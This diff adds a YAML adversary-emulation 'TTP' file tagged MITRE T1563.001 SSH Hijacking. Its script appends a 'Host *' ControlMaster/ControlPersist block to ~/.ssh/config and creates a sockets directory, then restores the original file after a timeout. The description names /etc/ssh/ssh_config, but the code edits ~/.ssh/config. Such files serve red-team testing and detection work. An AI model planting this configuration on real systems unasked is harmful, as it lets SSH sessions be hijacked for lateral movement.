@@ -1,0 +1,51 @@
+---
+api_version: 2.0
+uuid: 6061b020-4525-42dd-af54-3603c76b7223
+name: ssh_controlmaster
+authors:
+  - cedowens
+description: |
+  "This TTP appends to the bottom of /etc/ssh/ssh_config to install the ControlMaster configuration."
+args:
+  - name: timeout
+    description: Time in seconds before cleanup starts.
+    default: 120
+requirements:
+  platforms:
+    - os: linux
+mitre:
+  tactics:
+    - TA0008 Lateral Movement
+  techniques:
+    - T1563 Remote Service Session Hijacking
+  subtechniques:
+    - T1563.001 SSH Hijacking
+steps:
+  - name: append_to_config
+    inline: |
+      echo "First making a copy of the current ~/.ssh/config file..."
+      if [ -f ~/.ssh/config ]; then
+        cp ~/.ssh/config config_orig
+        echo "Appending the SSH ControlMaster configuration to the bottom of ~/.ssh/config..."
+        echo -e "Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/sockets/%r@%h:%p\n  ControlPersist 10m" >> ~/.ssh/config
+      else
+        echo "~/.ssh/config not found on the host so creating it..."
+        echo -e "Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/sockets/%r@%h:%p\n  ControlPersist 10m" > ~/.ssh/config
+      fi
+      echo "Next, creating the associated sockets directory..."
+      mkdir -p ~/.ssh/sockets
+      chmod 700 ~/.ssh/sockets
+
+    cleanup:
+      inline: |
+        echo "Sleeping {{ .Args.timeout }} seconds before starting cleanup..."
+        sleep {{ .Args.timeout }}
+        if [ -f config_orig ]; then
+          cp config_orig ~/.ssh/config && rm -f config_orig
+          echo "Restoring the original ~/.ssh/config file..."
+        else
+          echo "Deleting the ~/.ssh/config file created by this TTP..."
+          rm -f ~/.ssh/config
+        fi
+        rm -rf ~/.ssh/sockets
+        echo "Cleanup done!"
